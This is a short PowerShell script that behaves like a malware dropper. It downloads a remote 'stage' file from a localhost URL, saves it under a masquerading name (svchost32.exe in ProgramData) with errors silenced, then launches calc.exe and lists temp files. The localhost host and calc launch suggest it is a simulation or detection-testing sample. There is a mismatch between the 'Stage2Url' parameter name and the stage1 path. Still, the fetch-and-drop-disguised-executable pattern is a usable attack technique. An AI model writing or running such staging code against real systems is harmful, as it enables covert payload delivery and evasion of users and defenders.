[CmdletBinding()]
param(
    [string]$Stage2Url = "https://localhost:9001/stage1.ps1",
    [string]$DropPath = "C:\ProgramData\svchost32.exe",
    [int]$TimeoutSec = 152
)
Invoke-WebRequest -Uri $Stage2Url -OutFile $DropPath -UseBasicParsing -ErrorAction SilentlyContinue
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
